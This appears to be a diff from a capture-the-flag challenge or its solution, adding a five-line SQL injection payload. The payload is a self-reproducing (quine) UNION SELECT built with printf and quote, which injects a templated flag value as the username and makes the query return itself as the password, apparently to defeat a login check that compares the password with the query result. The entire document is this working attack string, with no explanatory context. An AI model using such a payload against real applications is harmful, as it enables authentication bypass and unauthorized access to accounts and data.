@@ -1,0 +1,5 @@
+' UNION SELECT '{flag.flag}' AS username, 
+printf(s.q, substr(quote(s.q), 2, 130))
+AS password FROM (SELECT ''' UNION SELECT ''{flag.flag}'' AS username, 
+printf(s.q, substr(quote(s.q), 2, 130))
+AS password FROM (SELECT ''%s'' AS q) AS s--' AS q) AS s--
